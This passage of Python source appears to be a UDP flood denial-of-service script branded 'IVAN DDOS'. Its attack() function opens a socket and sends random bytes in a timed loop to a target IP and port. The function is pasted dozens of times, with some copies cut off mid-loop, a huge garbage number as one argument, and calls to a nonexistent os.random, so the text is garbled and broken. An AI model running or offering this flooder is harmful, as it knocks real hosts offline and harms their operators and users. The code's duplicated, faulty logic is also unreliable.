            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
